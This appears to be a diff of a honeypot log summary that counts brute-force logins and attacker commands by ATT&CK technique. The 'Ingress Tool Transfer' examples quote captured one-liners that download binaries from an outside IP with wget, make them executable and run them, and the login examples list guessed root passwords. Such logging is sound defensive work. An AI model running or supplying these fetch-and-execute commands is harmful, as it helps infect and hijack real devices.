@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-18 15:00:13",
+  "generated": "2026-08-18 16:03:18",
   "totals": {
-    "commands": 8254,
-    "login_failed": 4797,
-    "login_success": 2574,
-    "sessions": 4890
+    "commands": 8262,
+    "login_failed": 4819,
+    "login_success": 2579,
+    "sessions": 4936
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4797,
+      "count": 4819,
       "examples": [
         "root / 19801024",
         "root / sunsunsun",
@@ -21,14 +21,14 @@
         "root / 826826826"
       ],
       "first": "2026-08-18T00:00:03.054815Z",
-      "last": "2026-08-18T14:56:08.564853Z",
-      "unique_ips": 70
+      "last": "2026-08-18T16:00:58.897339Z",
+      "unique_ips": 74
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 2574,
+      "count": 2579,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / 123@@@",
@@ -37,8 +37,8 @@
         "enable\\x00 / system\\x00"
       ],
       "first": "2026-08-18T00:06:39.840434Z",
-      "last": "2026-08-18T14:42:44.258731Z",
-      "unique_ips": 46
+      "last": "2026-08-18T15:58:22.975730Z",
+      "unique_ips": 50
     },
     {
       "id": "T1222.002",
@@ -60,7 +60,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 125,
+      "count": 127,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -69,14 +69,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T14:43:36.610816Z",
-      "unique_ips": 13
+      "last": "2026-08-18T15:58:44.647589Z",
+      "unique_ips": 14
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 10,
+      "count": 11,
       "examples": [
         "uname -s -v -n -r -m",
         "/bin/./uname -s -v -n -r -m",
@@ -85,8 +85,8 @@
         "uname -a"
       ],
       "first": "2026-08-18T02:27:39.980641Z",
-      "last": "2026-08-18T12:44:27.381303Z",
-      "unique_ips": 8
+      "last": "2026-08-18T15:52:53.982498Z",
+      "unique_ips": 9
     },
     {
       "id": "T1033",
@@ -170,7 +170,7 @@
     ],
     [
       "/bin/busybox",
-      273
+      274
     ],
     [
       "enable",
@@ -181,11 +181,11 @@
       14
     ],
     [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      10
+      "cd /proc && cat self/cmdline",
+      11
     ],
     [
-      "cd /proc && cat self/cmdline",
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       10
     ],
     [
